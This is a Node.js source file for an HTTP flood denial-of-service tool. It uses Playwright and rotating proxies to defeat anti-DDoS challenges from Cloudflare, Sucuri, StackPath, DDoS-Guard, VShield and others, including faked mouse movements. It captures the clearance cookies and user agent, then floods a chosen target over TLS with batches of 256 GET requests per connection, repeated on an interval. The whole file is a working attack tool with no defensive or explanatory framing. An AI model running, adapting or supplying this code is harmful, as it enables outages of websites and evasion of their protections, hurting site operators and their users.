const playwright = require('playwright');
const url = require('url');
const {constants} = require('crypto');
const cluster = require("cluster");
var http = require('http')
var tls = require('tls');

process.on('uncaughtException', function (er) {
    //console.error(er)
});
process.on('unhandledRejection', function (er) {
    //console.error(er)
});

var target_url = process.argv[2];
var delay = process.argv[3];
var threads = process.argv[4];
var proxys = process.argv[5].split(",");

if (cluster.isMaster) {
    for (var i = 0; i < threads; i++) {
        cluster.fork();
        console.log(`${i + 1} Thread Started`);
    }
    setTimeout(() => {
        process.exit(1);
    }, delay * 1000);
} else {
    console.log('Start browser!');
    solverInstance({
        "Target": target_url,
        "Time": delay,
        "Rate": 10000,
        "Proxy": getRandomElement(proxys)});

}


function getRandomElement(array) {
    var randomIndex = Math.floor(Math.random() * array.length);
    return array[randomIndex];
}

const JSList = {
    "js": [{
        "name": "CloudFlare",
        "navigations": 2,
        "locate": "<title>Just a moment...</title>"
    },{
        "name": "CloudFlare (Secure JS)",
        "navigations": 2,
        "locate": "<h2 class=\"h2\" id=\"challenge-running\">"
    }, {
        "name": "CloudFlare (Normal JS)",
        "navigations": 2,
        "locate": "<div class=\"cf-browser-verification cf-im-under-attack\">"
    }, {
        "name": "BlazingFast v1.0",
        "navigations": 1,
        "locate": "<br>DDoS Protection by</font> Blazingfast.io</a>"
    }, {
        "name": "BlazingFast v2.0",
        "navigations": 1,
        "locate": "Verifying your browser, please wait...<br>DDoS Protection by</font> Blazingfast.io</a></h1>"
    }, {
        "name": "Sucuri",
        "navigations": 4,
        "locate": "<html><title>You are being redirected...</title>"
    }, {
        "name": "StackPath",
        "navigations": 4,
        "locate": "<title>Site verification</title>"
    }, {
        "name": "StackPath EnforcedJS",
        "navigations": 4,
        "locate": "<title>StackPath</title>"
    }, {
        "name": "React",
        "navigations": 1,
        "locate": "Check your browser..."
    }, {
        "name": "DDoS-Guard",
        "navigations": 1,
        "locate": "DDoS protection by DDos-Guard"
    }, {
        "name": "VShield",
        "navigations": 1,
        "locate": "fw.vshield.pro/v2/bot-detector.js"
    }, {
        "name": "GameSense",
        "navigations": 1,
        "locate": "<title>GameSense</title>"
    }, {
        "name": "PoW Shield",
        "navigations": 1,
        "locate": "<title>PoW Shield</title>"
    }]
}


function cookiesToStr(cookies) {
    if (Array.isArray(cookies)) {
        return cookies.reduce((prev, {
            name, value
        }) => {
            if (!prev) return `${name}=${value}`;
            return `${prev}; ${name}=${value}`;
        }, "");
    }
}

function JSDetection(argument) {
    for (let i = 0; i < JSList['js'].length; i++) {
        if (argument.includes(JSList['js'][i].locate)) {
            return JSList['js'][i]
        }
    }
}

function randomIntFromInterval(min,max)
{
    return Math.floor( Math.random()*  ( max - min + 1 ) + min );
}
function solverInstance(args) {
    return new Promise((resolve, reject) => {
        playwright.firefox.launch({
            headless: true,
            proxy: {
                server: 'http://' + args.Proxy
            },
        }).then(async (browser) => {

            const page = await browser.newPage();

            try {
                await page.goto(args.Target);
            } catch (e) {

                await browser.close();
                reject(e);
            }

            const ua = await page.evaluate(() => navigator.userAgent);
            console.log(`UA: ${ua}`);

            for (let detect = 0; detect < 5; detect++) {

                var source = await page.content();
                var title = await page.title()
                //console.log(source);
                var JS = await JSDetection(source);
                if (title === "Access denied") {
                    console.log(`Proxy Banned!!!`);
                }
                if (JS) {
                    console.log(`Detect ${JS.name}`);
                    if (JS.name === "VShield") {
                        await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
                        await page.mouse.down();
                        await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
                        await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
                        await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
                        await page.mouse.move(randomIntFromInterval(100), randomIntFromInterval(100));
                        await page.mouse.up();
                    }

                    for (let i = 0; i < JS.navigations; i++) {
                        var [response] = await Promise.all([page.waitForNavigation(),])
                        console.log(`Await redirect ${i + 1}`);
                    }
                }
            }

            const cookies = cookiesToStr(await page.context().cookies());
            console.log(`${cookies}`);
            resolve(cookies);
            await browser.close();
            startflood(args, ua, cookies, page);
        })
    })
}

function startflood(args, ua, cookies,page) {
    console.log('Start attack!');
    const target = args.Target.split('""')[0];
    var parsed = url.parse(target);
    setInterval(() => {
        var req = http.request({
            //set proxy session
            host: args.Proxy.split(':')[0],
            port: args.Proxy.split(':')[1],
            method: 'CONNECT',
            path: parsed.host + ":443"
        }, (err) => {
            req.end();
            return 1;
        });
        req.on('connect', function (res, socket, head) {
            var tlsConnection = tls.connect({
                host: parsed.host,
                servername: parsed.host,
                ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
                secureProtocol: ['TLSv1_2_method', 'TLSv1_3_method', 'SSL_OP_NO_SSLv3', 'SSL_OP_NO_SSLv2'],
                secure: true,
                requestCert: true,
                honorCipherOrder: true,
                secureOptions: constants.SSL_OP_NO_SSLv3,
                rejectUnauthorized: false,
                socket: socket
            }, function () {
                tlsConnection.setKeepAlive(true, 10000)
                tlsConnection.setTimeout(10000);
                console.log("GET "+parsed.pathname+" HTTP/1.1\r\nHost: "+parsed.host+"\r\nUser-Agent: "+ua+" \r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nCookie: "+cookies+" \r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\nTE: trailers\r\n\r\n")
                for (let j = 0; j < 256; j++) {
                    tlsConnection.write("GET "+parsed.pathname+" HTTP/1.1\r\nHost: "+parsed.host+"\r\nUser-Agent: "+ua+" \r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\nCookie: "+cookies+" \r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\nTE: trailers\r\n\r\n");
                }
                tlsConnection.end();
                //tlsConnection.destroy();
            });
            tlsConnection.setEncoding('utf8');
            tlsConnection.on('error', function (data) {
                tlsConnection.end();
                //console.log(data);
            });
            tlsConnection.on('data', function (data) {
                //console.log(data);
                if (data.includes("403 Forbidden")) {
                    process.exit(1);
                    tlsConnection.end();
                }
                if (data.includes("429 Too Many")) {
                    //console.log("Rate limit! Change ip");
                    tlsConnection.end();
                }
            });
        });
        req.end();
    });
}



